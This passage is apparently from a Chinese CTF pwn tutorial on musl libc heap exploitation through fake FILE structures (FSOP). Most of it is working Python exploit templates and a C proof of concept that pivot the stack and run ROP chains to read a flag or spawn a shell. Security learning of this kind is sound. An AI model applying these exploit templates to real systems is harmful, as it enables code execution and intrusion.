class="built_in">next</span>()</span><br><span class="line">pop_rdi_ret = libc.search(asm(<span class="string">&quot;pop rdi;ret&quot;</span>), executable=<span class="literal">True</span>).<span class="built_in">next</span>()</span><br><span class="line">pop_rsi_ret = libc.search(asm(<span class="string">&quot;pop rsi;ret&quot;</span>), executable=<span class="literal">True</span>).<span class="built_in">next</span>()</span><br><span class="line">pop_rdx_ret = libc.search(asm(<span class="string">&quot;pop rdx;ret&quot;</span>), executable=<span class="literal">True</span>).<span class="built_in">next</span>()</span><br><span class="line">pop_rax_ret = libc.search(asm(<span class="string">&quot;pop rax;ret&quot;</span>), executable=<span class="literal">True</span>).<span class="built_in">next</span>()</span><br><span class="line">ret = libc.search(asm(<span class="string">&quot;ret&quot;</span>), executable=<span class="literal">True</span>).<span class="built_in">next</span>()</span><br><span class="line">buf_addr = payload_addr</span><br><span class="line"></span><br><span class="line">rop = <span class="string">&#x27;&#x27;</span></span><br><span class="line">rop += p64(pop_rdi_ret)</span><br><span class="line">rop += p64(buf_addr)</span><br><span class="line">rop += p64(pop_rsi_ret)</span><br><span class="line">rop += p64(<span class="number">0</span>)</span><br><span class="line">rop += p64(libc.sym[<span class="string">&#x27;open&#x27;</span>])</span><br><span class="line">rop += p64(pop_rdi_ret)</span><br><span class="line">rop += p64(<span class="number">3</span>)</span><br><span class="line">rop += p64(pop_rsi_ret)</span><br><span class="line">rop += p64(buf_addr)</span><br><span class="line">rop += p64(pop_rdx_ret)</span><br><span class="line">rop += p64(<span class="number">0x100</span>)</span><br><span class="line">rop += p64(libc.sym[<span class="string">&#x27;read&#x27;</span>])</span><br><span class="line">rop += p64(pop_rdi_ret)</span><br><span class="line">rop += p64(<span class="number">1</span>)</span><br><span class="line">rop += p64(pop_rsi_ret)</span><br><span class="line">rop += p64(buf_addr)</span><br><span class="line">rop += p64(pop_rdx_ret)</span><br><span class="line">rop += p64(<span class="number">0x100</span>)</span><br><span class="line">rop += p64(libc.sym[<span class="string">&#x27;write&#x27;</span>])</span><br><span class="line"></span><br><span class="line">fake_file = <span class="string">&quot;&quot;</span></span><br><span class="line">fake_file += <span class="string">&quot;./flag&quot;</span>.ljust(<span class="number">8</span>, <span class="string">&#x27;\x00&#x27;</span>)  <span class="comment"># flags</span></span><br><span class="line">fake_file += p64(<span class="number">0</span>)  <span class="comment"># rpos</span></span><br><span class="line">fake_file += p64(<span class="number">0</span>)  <span class="comment"># rend</span></span><br><span class="line">fake_file += p64(<span class="number">0</span>)  <span class="comment"># close</span></span><br><span class="line">fake_file += p64(<span class="number">0</span>)  <span class="comment"># wend</span></span><br><span class="line">fake_file += p64(<span class="number">0</span>)  <span class="comment"># wpos</span></span><br><span class="line">fake_file += p64(rop_addr)  <span class="comment"># mustbezero_1</span></span><br><span class="line">fake_file += p64(ret)  <span class="comment"># wbase</span></span><br><span class="line">fake_file += p64(<span class="number">0</span>)  <span class="comment"># read</span></span><br><span class="line">fake_file += p64(magic_gadget)  <span class="comment"># write</span></span><br><span class="line">fake_file = fake_file.ljust(<span class="number">0x90</span>, <span class="string">&#x27;\x00&#x27;</span>)  <span class="comment"># lock = 0</span></span><br><span class="line"></span><br><span class="line">fake_group = p64(fake_meta_addr) + p64(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">fake_meta = <span class="string">&#x27;&#x27;</span></span><br><span class="line">fake_meta += p64(fake_file_addr)  <span class="comment"># prev</span></span><br><span class="line">fake_meta += p64(stderr_used_addr)  <span class="comment"># next</span></span><br><span class="line">fake_meta += p64(fake_group_addr)  <span class="comment"># mem</span></span><br><span class="line">fake_meta += p32(<span class="number">0b0000</span>)  <span class="comment"># avail_mask</span></span><br><span class="line">fake_meta += p32(<span class="number">0b1110</span>)  <span class="comment"># freed_mask</span></span><br><span class="line">last_idx = <span class="number">3</span></span><br><span class="line">freeable = <span class="number">1</span></span><br><span class="line">sizeclass = <span class="number">1</span></span><br><span class="line">maplen = <span class="number">0</span></span><br><span class="line">fake_meta += p64(last_idx | (freeable &lt;&lt; <span class="number">5</span>) | (sizeclass &lt;&lt; <span class="number">6</span>) | (sizeclass &lt;&lt; <span class="number">12</span>))</span><br><span class="line"></span><br><span class="line">fake_meta_area = p64(leak_secret) + fake_meta</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;&#x27;</span></span><br><span class="line">payload += fake_file</span><br><span class="line">payload += fake_group</span><br><span class="line">payload = payload.ljust(rop_addr - payload_addr, <span class="string">&#x27;\x00&#x27;</span>) <span class="comment"># fake chunk</span></span><br><span class="line">payload += rop</span><br><span class="line"><span class="keyword">assert</span> <span class="built_in">len</span>(payload) &lt;= fake_meta_area_offset</span><br><span class="line">payload = payload.ljust(fake_meta_area_offset, <span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">payload += fake_meta_area</span><br><span class="line">payload = payload.ljust(<span class="number">0x2000</span>, <span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line"></span><br><span class="line">fake_node = <span class="string">&#x27;&#x27;</span></span><br><span class="line">fake_node += p64(<span class="number">4</span>)  <span class="comment"># id</span></span><br><span class="line">fake_node += p64(fake_chunk_addr)  <span class="comment"># name -&gt; fake chunk</span></span><br><span class="line">fake_node += p64(<span class="number">0x100</span>)  <span class="comment"># name_size</span></span><br><span class="line">fake_node += p64(<span class="number">2</span>)  <span class="comment"># type</span></span><br><span class="line">fake_node += p64(<span class="number">0xdeadbeef</span>)  <span class="comment"># fa</span></span><br><span class="line">fake_node += p64(<span class="number">0</span>)  <span class="comment"># ls</span></span><br><span class="line">fake_node += p64(<span class="number">0</span>)  <span class="comment"># rs</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">5</span>, fake_node)</span><br><span class="line">add(<span class="number">6</span>, payload)</span><br></pre></td></tr></table></figure></div>
<p>而在有沙箱保护的情况下，需要进行 orw 。</p>
<p>对于 musl-1.2.1 及以上版本，可以通过如下 gadget
实现栈迁移和程序流劫持。 <div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">mov rsp, qword ptr [rdi + 0x30] ; jmp qword ptr [rdi + 0x38]</span><br></pre></td></tr></table></figure></div>
总结来说，就是在有沙箱时，需要修改 <code>_IO_FILE</code> 结构体的 3
个地方： - <code>f-&gt;wbase</code> 写入第一个 gadget 地址使得
<code>f-&gt;wpos</code> 、<code>f-&gt;wbase</code> 不等的同时能够执行到
gadget - <code>write</code> 写入刚才提到的栈迁移的 <code>gadget</code> -
偏移 0x30 处写入新的栈地址配合栈迁移 gadget 完成栈迁移 -
此外还需要在其他地方构造好 ROP 链用于 orw</p>
<p>常用模板如下（<a class="link" 
 href="https://gitcode.net/qq_45323960/attachment/-/tree/master/musl_pwn/qwb2022_UserManager" >2022强网杯UserManager <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>）：
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line">payload_addr = libc.address - <span class="number">0x6fe0</span></span><br><span class="line">fake_file_addr = payload_addr</span><br><span class="line">fake_group_addr = fake_file_addr + <span class="number">0x90</span></span><br><span class="line">fake_chunk_addr = fake_group_addr + <span class="number">0x10</span></span><br><span class="line">fake_meta_area_offset = ((payload_addr + <span class="number">0xFFF</span>) &amp; ~<span class="number">0xFFF</span>) - payload_addr</span><br><span class="line">fake_meta_offset = fake_meta_area_offset + <span class="number">8</span></span><br><span class="line">fake_meta_addr = payload_addr + fake_meta_offset</span><br><span class="line">stderr_used_addr = libc.address + <span class="number">0xb43a0</span></span><br><span class="line">rop_addr = fake_chunk_addr</span><br><span class="line"></span><br><span class="line">magic_gadget = libc.search(asm(<span class="string">&#x27;mov rsp, qword ptr [rdi + 0x30] ; jmp qword ptr [rdi + 0x38]&#x27;</span>), executable=<span class="literal">True</span>).<span class="built_in">next</span>()</span><br><span class="line">pop_rdi_ret = libc.search(asm(<span class="string">&quot;pop rdi;ret&quot;</span>), executable=<span class="literal">True</span>).<span class="built_in">next</span>()</span><br><span class="line">pop_rsi_ret = libc.search(asm(<span class="string">&quot;pop rsi;ret&quot;</span>), executable=<span class="literal">True</span>).<span class="built_in">next</span>()</span><br><span class="line">pop_rdx_ret = libc.search(asm(<span class="string">&quot;pop rdx;ret&quot;</span>), executable=<span class="literal">True</span>).<span class="built_in">next</span>()</span><br><span class="line">pop_rax_ret = libc.search(asm(<span class="string">&quot;pop rax;ret&quot;</span>), executable=<span class="literal">True</span>).<span class="built_in">next</span>()</span><br><span class="line">ret = libc.search(asm(<span class="string">&quot;ret&quot;</span>), executable=<span class="literal">True</span>).<span class="built_in">next</span>()</span><br><span class="line">buf_addr = payload_addr</span><br><span class="line"></span><br><span class="line">rop = <span class="string">&#x27;&#x27;</span></span><br><span class="line">rop += p64(pop_rdi_ret)</span><br><span class="line">rop += p64(buf_addr)</span><br><span class="line">rop += p64(pop_rsi_ret)</span><br><span class="line">rop += p64(<span class="number">0</span>)</span><br><span class="line">rop += p64(libc.sym[<span class="string">&#x27;open&#x27;</span>])</span><br><span class="line">rop += p64(pop_rdi_ret)</span><br><span class="line">rop += p64(<span class="number">3</span>)</span><br><span class="line">rop += p64(pop_rsi_ret)</span><br><span class="line">rop += p64(buf_addr)</span><br><span class="line">rop += p64(pop_rdx_ret)</span><br><span class="line">rop += p64(<span class="number">0x100</span>)</span><br><span class="line">rop += p64(libc.sym[<span class="string">&#x27;read&#x27;</span>])</span><br><span class="line">rop += p64(pop_rdi_ret)</span><br><span class="line">rop += p64(<span class="number">1</span>)</span><br><span class="line">rop += p64(pop_rsi_ret)</span><br><span class="line">rop += p64(buf_addr)</span><br><span class="line">rop += p64(pop_rdx_ret)</span><br><span class="line">rop += p64(<span class="number">0x100</span>)</span><br><span class="line">rop += p64(libc.sym[<span class="string">&#x27;write&#x27;</span>])</span><br><span class="line"></span><br><span class="line">fake_file = <span class="string">&quot;&quot;</span></span><br><span class="line">fake_file += <span class="string">&quot;./flag&quot;</span>.ljust(<span class="number">8</span>, <span class="string">&#x27;\x00&#x27;</span>)  <span class="comment"># flags</span></span><br><span class="line">fake_file += p64(<span class="number">0</span>)  <span class="comment"># rpos</span></span><br><span class="line">fake_file += p64(<span class="number">0</span>)  <span class="comment"># rend</span></span><br><span class="line">fake_file += p64(<span class="number">0</span>)  <span class="comment"># close</span></span><br><span class="line">fake_file += p64(<span class="number">0</span>)  <span class="comment"># wend</span></span><br><span class="line">fake_file += p64(<span class="number">0</span>)  <span class="comment"># wpos</span></span><br><span class="line">fake_file += p64(rop_addr)  <span class="comment"># mustbezero_1</span></span><br><span class="line">fake_file += p64(ret)  <span class="comment"># wbase</span></span><br><span class="line">fake_file += p64(<span class="number">0</span>)  <span class="comment"># read</span></span><br><span class="line">fake_file += p64(magic_gadget)  <span class="comment"># write</span></span><br><span class="line">fake_file = fake_file.ljust(<span class="number">0x90</span>, <span class="string">&#x27;\x00&#x27;</span>)  <span class="comment"># lock = 0</span></span><br><span class="line"></span><br><span class="line">fake_group = p64(fake_meta_addr) + p64(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">fake_meta = <span class="string">&#x27;&#x27;</span></span><br><span class="line">fake_meta += p64(fake_file_addr)  <span class="comment"># prev</span></span><br><span class="line">fake_meta += p64(stderr_used_addr)  <span class="comment"># next</span></span><br><span class="line">fake_meta += p64(fake_group_addr)  <span class="comment"># mem</span></span><br><span class="line">fake_meta += p32(<span class="number">0b0000</span>)  <span class="comment"># avail_mask</span></span><br><span class="line">fake_meta += p32(<span class="number">0b1110</span>)  <span class="comment"># freed_mask</span></span><br><span class="line">last_idx = <span class="number">3</span></span><br><span class="line">freeable = <span class="number">1</span></span><br><span class="line">sizeclass = <span class="number">8</span></span><br><span class="line">maplen = <span class="number">0</span></span><br><span class="line">fake_meta += p64(last_idx | (freeable &lt;&lt; <span class="number">5</span>) | (sizeclass &lt;&lt; <span class="number">6</span>) | (sizeclass &lt;&lt; <span class="number">12</span>))</span><br><span class="line"></span><br><span class="line">fake_meta_area = p64(leak_secret) + fake_meta</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;&#x27;</span></span><br><span class="line">payload += fake_file</span><br><span class="line">payload += fake_group</span><br><span class="line">payload += rop</span><br><span class="line"><span class="keyword">assert</span> <span class="built_in">len</span>(payload) &lt;= fake_meta_area_offset</span><br><span class="line">payload = payload.ljust(fake_meta_area_offset, <span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">payload += fake_meta_area</span><br><span class="line">payload = payload.ljust(<span class="number">0x2000</span>, <span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line"></span><br><span class="line">fake_node = <span class="string">&#x27;&#x27;</span></span><br><span class="line">fake_node += p64(<span class="number">4</span>)  <span class="comment"># id</span></span><br><span class="line">fake_node += p64(fake_chunk_addr)  <span class="comment"># name -&gt; fake chunk</span></span><br><span class="line">fake_node += p64(<span class="number">0x100</span>)  <span class="comment"># name_size</span></span><br><span class="line">fake_node += p64(<span class="number">2</span>)  <span class="comment"># type</span></span><br><span class="line">fake_node += p64(<span class="number">0xdeadbeef</span>)  <span class="comment"># fa</span></span><br><span class="line">fake_node += p64(<span class="number">0</span>)  <span class="comment"># ls</span></span><br><span class="line">fake_node += p64(<span class="number">0</span>)  <span class="comment"># rs</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">5</span>, fake_node)</span><br><span class="line">add(<span class="number">6</span>, payload)</span><br></pre></td></tr></table></figure></div></p>
<p><a class="link" 
 href="https://gitcode.net/qq_45323960/attachment/-/tree/master/musl_pwn/musl_FSOP" >poc <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>
如下：</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;ctype.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span> <span class="title">FILE</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span> &#123;</span></span><br><span class="line">    <span class="type">unsigned</span> flags;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> *rpos, *rend;</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> (*close)(FILE *);</span><br><span class="line"></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> *wend, *wpos;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> *mustbezero_1;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> *wbase;</span><br><span class="line"></span><br><span class="line">    <span class="type">size_t</span> (*read)(FILE *, <span class="type">unsigned</span> <span class="type">char</span> *, <span class="type">size_t</span>);</span><br><span class="line"></span><br><span class="line">    <span class="type">size_t</span> (*write)(FILE *, <span class="type">const</span> <span class="type">unsigned</span> <span class="type">char</span> *, <span class="type">size_t</span>);</span><br><span class="line"></span><br><span class="line">    <span class="type">off_t</span> (*seek)(FILE *, <span class="type">off_t</span>, <span class="type">int</span>);</span><br><span class="line"></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> *buf;</span><br><span class="line">    <span class="type">size_t</span> buf_size;</span><br><span class="line">    FILE *prev, *next;</span><br><span class="line">    <span class="type">int</span> fd;</span><br><span class="line">    <span class="type">int</span> pipe_pid;</span><br><span class="line">    <span class="type">long</span> lockcount;</span><br><span class="line">    <span class="type">int</span> mode;</span><br><span class="line">    <span class="keyword">volatile</span> <span class="type">int</span> lock;</span><br><span class="line">    <span class="type">int</span> lbf;</span><br><span class="line">    <span class="type">void</span> *cookie;</span><br><span class="line">    <span class="type">off_t</span> off;</span><br><span class="line">    <span class="type">char</span> *getln_buf;</span><br><span class="line">    <span class="type">void</span> *mustbezero_2;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> *shend;</span><br><span class="line">    <span class="type">off_t</span> shlim, shcnt;</span><br><span class="line">    FILE *prev_locked, *next_locked;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> __<span class="title">locale_struct</span> *<span class="title">locale</span>;</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">size_t</span> rop[<span class="number">0x100</span>];</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">size_t</span> libc_base = (<span class="type">size_t</span>) system - <span class="number">0x438a8</span>;</span><br><span class="line"></span><br><span class="line">    FILE *stderr_used = (FILE *) (libc_base + <span class="number">0x295120</span>);</span><br><span class="line">    <span class="type">size_t</span> magic_gadget = libc_base + <span class="number">0x4a736</span>; <span class="comment">// mov rsp, qword ptr [rdi + 0x30] ; jmp qword ptr [rdi + 0x38]</span></span><br><span class="line">    <span class="type">size_t</span> pop_rax_ret = libc_base + <span class="number">0x1b95d</span>;</span><br><span class="line">    <span class="type">size_t</span> pop_rdi_ret = libc_base + <span class="number">0x14be2</span>;</span><br><span class="line">    <span class="type">size_t</span> pop_rsi_ret = libc_base + <span class="number">0x1b2da</span>;</span><br><span class="line">    <span class="type">size_t</span> pop_rdx_ret = libc_base + <span class="number">0x1aeab</span>;</span><br><span class="line">    <span class="type">size_t</span> syscall_ret = libc_base + <span class="number">0x237d7</span>;</span><br><span class="line">    <span class="type">size_t</span> ret = libc_base + <span class="number">0x1558</span>;</span><br><span class="line"></span><br><span class="line">    *(<span class="type">size_t</span> *) &amp;stderr_used-&gt;write = magic_gadget;</span><br><span class="line">    stderr_used-&gt;wbase = (<span class="type">unsigned</span> <span class="type">char</span> *) ret;</span><br><span class="line">    assert(stderr_used-&gt;wbase != stderr_used-&gt;wpos);</span><br><span class="line">    stderr_used-&gt;mustbezero_1 = (<span class="type">unsigned</span> <span class="type">char</span> *) rop;</span><br><span class="line"></span><br><span class="line">    <span class="type">char</span> *buf = (<span class="type">char</span> *) &amp;rop[<span class="number">30</span>];</span><br><span class="line">    <span class="built_in">strcpy</span>(buf, <span class="string">&quot;./flag&quot;</span>);</span><br><span class="line"></span><br><span class="line">    rop[<span class="number">0</span>] = pop_rdi_ret;</span><br><span class="line">    rop[<span class="number">1</span>] = (<span class="type">size_t</span>) buf;</span><br><span class="line">    rop[<span class="number">2</span>] = pop_rsi_ret;</span><br><span class="line">    rop[<span class="number">3</span>] = <span class="number">0</span>;</span><br><span class="line">    rop[<span class="number">4</span>] = pop_rax_ret;</span><br><span class="line">    rop[<span class="number">5</span>] = <span class="number">2</span>;</span><br><span class="line">    rop[<span class="number">6</span>] = syscall_ret;</span><br><span class="line"></span><br><span class="line">    rop[<span class="number">7</span>] = pop_rdi_ret;</span><br><span class="line">    rop[<span class="number">8</span>] = <span class="number">3</span>;</span><br><span class="line">    rop[<span class="number">9</span>] = pop_rsi_ret;</span><br><span class="line">    rop[<span class="number">10</span>] = (<span class="type">size_t</span>) buf;</span><br><span class="line">    rop[<span class="number">11</span>] = pop_rdx_ret;</span><br><span class="line">    rop[<span class="number">12</span>] = <span class="number">0x100</span>;</span><br><span class="line">    rop[<span class="number">13</span>] = pop_rax_ret;</span><br><span class="line">    rop[<span class="number">14</span>] = <span class="number">0</span>;</span><br><span class="line">    rop[<span class="number">15</span>] = syscall_ret;</span><br><span class="line"></span><br><span class="line">    rop[<span class="number">16</span>] = pop_rax_ret;</span><br><span class="line">    rop[<span class="number">17</span>] = <span class="number">1</span>;</span><br><span class="line">    rop[<span class="number">18</span>] = pop_rdi_ret;</span><br><span class="line">    rop[<span class="number">19</span>] = <span class="number">1</span>;</span><br><span class="line">    rop[<span class="number">20</span>] = pop_rsi_ret;</span><br><span class="line">    rop[<span class="number">21</span>] = (<span class="type">size_t</span>) buf;</span><br><span class="line">    rop[<span class="number">22</span>] = syscall_ret;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p>对于 musl-1.2.1 及以下的版本，可以使用如下 gadget 。或者直接将
<code>chunk</code> 申请到栈上写 rop 。例如这道<a class="link" 
 href="https://gitcode.net/qq_45323960/attachment/-/tree/master/musl_pwn/WMCTF-Nescafe" >题目 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>。
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">mov rdx, [rdi+0x30]; mov rsp, rdx; mov rdx, [rdi+0x38]; jmp rdx;</span><br></pre></td></tr></table></figure></div></p>
<h3 id="puts-调用链">puts 调用链</h3>
<p>分析 <code>puts</code> 函数的调用链，发现最终会调用</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">puts</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *s)</span> &#123;</span><br><span class="line">    <span class="type">int</span> r;</span><br><span class="line">    FLOCK(<span class="built_in">stdout</span>);</span><br><span class="line">    r = -(<span class="built_in">fputs</span>(s, <span class="built_in">stdout</span>) &lt; <span class="number">0</span> || putc_unlocked(<span class="string">&#x27;\n&#x27;</span>, <span class="built_in">stdout</span>) &lt; <span class="number">0</span>);</span><br><span class="line">    FUNLOCK(<span class="built_in">stdout</span>);</span><br><span class="line">    <span class="keyword">return</span> r;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">fputs</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *<span class="keyword">restrict</span> s, FILE *<span class="keyword">restrict</span> f)</span> &#123;</span><br><span class="line">    <span class="type">size_t</span> l = <span class="built_in">strlen</span>(s);</span><br><span class="line">    <span class="keyword">return</span> (fwrite(s, <span class="number">1</span>, l, f) == l) - <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">size_t</span> <span class="title function_">fwrite</span><span class="params">(<span class="type">const</span> <span class="type">void</span> *<span class="keyword">restrict</span> src, <span class="type">size_t</span> size, <span class="type">size_t</span> nmemb, FILE *<span class="keyword">restrict</span> f)</span> &#123;</span><br><span class="line">    <span class="type">size_t</span> k, l = size * nmemb;</span><br><span class="line">    <span class="keyword">if</span> (!size) nmemb = <span class="number">0</span>;</span><br><span class="line">    FLOCK(f);</span><br><span class="line">    k = __fwritex(src, l, f);</span><br><span class="line">    FUNLOCK(f);</span><br><span class="line">    <span class="keyword">return</span> k == l ? nmemb : k / size;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> __towrite(FILE *f) &#123;</span><br><span class="line">    ...</span><br><span class="line">    <span class="keyword">if</span> (f-&gt;flags &amp; F_NOWR) &#123;</span><br><span class="line">        f-&gt;flags |= F_ERR;</span><br><span class="line">        <span class="keyword">return</span> EOF;</span><br><span class="line">    &#125;</span><br><span class="line">    ...</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">size_t</span> __fwritex(<span class="type">const</span> <span class="type">unsigned</span> <span class="type">char</span> *<span class="keyword">restrict</span> s, <span class="type">size_t</span> l, FILE *<span class="keyword">restrict</span> f) &#123;</span><br><span class="line">    <span class="type">size_t</span> i = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!f-&gt;wend &amp;&amp; __towrite(f)) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (l &gt; f-&gt;wend - f-&gt;wpos) <span class="keyword">return</span> f-&gt;write(f, s, l);</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p>常用模板如下（<a class="link" 
 href="https://gitcode.net/qq_45323960/attachment/-/tree/master/musl_pwn/starctf2022_BabyNote" >2022*CTF
BabyNote <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>）： get shell <div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line">fake_file = <span class="string">&quot;&quot;</span></span><br><span class="line">fake_file += <span class="string">&quot;/bin/sh&quot;</span>.ljust(<span class="number">8</span>, <span class="string">&#x27;\x00&#x27;</span>)  <span class="comment"># flags</span></span><br><span class="line">fake_file += p64(<span class="number">0</span>)  <span class="comment"># rpos</span></span><br><span class="line">fake_file += p64(<span class="number">0</span>)  <span class="comment"># rend</span></span><br><span class="line">fake_file += p64(<span class="number">0</span>)  <span class="comment"># close</span></span><br><span class="line">fake_file += p64(<span class="number">0x114514</span>)  <span class="comment"># wend</span></span><br><span class="line">fake_file += p64(<span class="number">0x114514</span>)  <span class="comment"># wpos</span></span><br><span class="line">fake_file += p64(<span class="number">0</span>)  <span class="comment"># mustbezero_1</span></span><br><span class="line">fake_file += p64(<span class="number">0x114514</span>)  <span class="comment"># wbase</span></span><br><span class="line">fake_file += p64(<span class="number">0</span>)  <span class="comment"># read</span></span><br><span class="line">fake_file += p64(libc.sym[<span class="string">&#x27;system&#x27;</span>])  <span class="comment"># write</span></span><br><span class="line">fake_file = fake_file.ljust(<span class="number">0x80</span>, <span class="string">&#x27;\x00&#x27;</span>)</span><br></pre></td></tr></table></figure></div> orw（musl-1.2.2）
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line">fake_name_addr = libc.address + <span class="number">0xb7990</span></span><br><span class="line">payload_addr = libc.address - <span class="number">0x6fe0</span></span><br><span class="line">fake_file_addr = payload_addr</span><br><span class="line">fake_group_addr = fake_file_addr + <span class="number">0x90</span></span><br><span class="line">fake_chunk_addr = fake_group_addr + <span class="number">0x10</span></span><br><span class="line">fake_meta_area_offset = ((payload_addr + <span class="number">0xFFF</span>) &amp; ~<span class="number">0xFFF</span>) - payload_addr</span><br><span class="line">fake_meta_offset = fake_meta_area_offset + <span class="number">8</span></span><br><span class="line">fake_meta_addr = payload_addr + fake_meta_offset</span><br><span class="line">stderr_used_addr = libc.address + <span class="number">0xb43a0</span></span><br><span class="line">rop_addr = fake_chunk_addr</span><br><span class="line"></span><br><span class="line">magic_gadget = libc.search(asm(<span class="string">&#x27;mov rsp, qword ptr [rdi + 0x30] ; jmp qword ptr [rdi + 0x38]&#x27;</span>), executable=<span class="literal">True</span>).<span class="built_in">next</span>()</span><br><span class="line">pop_rdi_ret = libc.search(asm(<span class="string">&quot;pop rdi;ret&quot;</span>), executable=<span class="literal">True</span>).<span class="built_in">next</span>()</span><br><span class="line">pop_rsi_ret = libc.search(asm(<span class="string">&quot;pop rsi;ret&quot;</span>), executable=<span class="literal">True</span>).<span class="built_in">next</span>()</span><br><span class="line">pop_rdx_ret = libc.search(asm(<span class="string">&quot;pop rdx;ret&quot;</span>), executable=<span class="literal">True</span>).<span class="built_in">next</span>()</span><br><span class="line">pop_rax_ret = libc.search(asm(<span class="string">&quot;pop rax;ret&quot;</span>), executable=<span class="literal">True</span>).<span class="built_in">next</span>()</span><br><span class="line">ret = libc.search(asm(<span class="string">&quot;ret&quot;</span>), executable=<span class="literal">True</span>).<span class="built_in">next</span>()</span><br><span class="line">buf_addr = payload_addr</span><br><span class="line"></span><br><span class="line">rop = <span class="string">&#x27;&#x27;</span></span><br><span class="line">rop += p64(pop_rdi_ret)</span><br><span class="line">rop += p64(buf_addr)</span><br><span class="line">rop += p64(pop_rsi_ret)</span><br><span class="line">rop += p64(<span class="number">0</span>)</span><br><span class="line">rop += p64(libc.sym[<span class="string">&#x27;open&#x27;</span>])</span><br><span class="line">rop += p64(pop_rdi_ret)</span><br><span class="line">rop += p64(<span class="number">3</span>)</span><br><span class="line">rop += p64(pop_rsi_ret)</span><br><span class="line">rop += p64(buf_addr)</span><br><span class="line">rop += p64(pop_rdx_ret)</span><br><span class="line">rop += p64(<span class="number">0x100</span>)</span><br><span class="line">rop += p64(libc.sym[<span class="string">&#x27;read&#x27;</span>])</span><br><span class="line">rop += p64(pop_rdi_ret)</span><br><span class="line">rop += p64(<span class="number">1</span>)</span><br><span class="line">rop += p64(pop_rsi_ret)</span><br><span class="line">rop += p64(buf_addr)</span><br><span class="line">rop += p64(pop_rdx_ret)</span><br><span class="line">rop += p64(<span class="number">0x100</span>)</span><br><span class="line">rop += p64(libc.sym[<span class="string">&#x27;write&#x27;</span>])</span><br><span class="line"></span><br><span class="line">fake_file = <span class="string">&quot;&quot;</span></span><br><span class="line">fake_file += <span class="string">&quot;./flag&quot;</span>.ljust(<span class="number">8</span>, <span class="string">&#x27;\x00&#x27;</span>)  <span class="comment"># flags</span></span><br><span class="line">fake_file += p64(<span class="number">0</span>)  <span class="comment"># rpos</span></span><br><span class="line">fake_file += p64(<span class="number">0</span>)  <span class="comment"># rend</span></span><br><span class="line">fake_file += p64(<span class="number">0</span>)  <span class="comment"># close</span></span><br><span class="line">fake_file += p64(<span class="number">0</span>)  <span class="comment"># wend</span></span><br><span class="line">fake_file += p64(<span class="number">0</span>)  <span class="comment"># wpos</span></span><br><span class="line">fake_file += p64(rop_addr)  <span class="comment"># mustbezero_1</span></span><br><span class="line">fake_file += p64(ret)  <span class="comment"># wbase</span></span><br><span class="line">fake_file += p64(<span 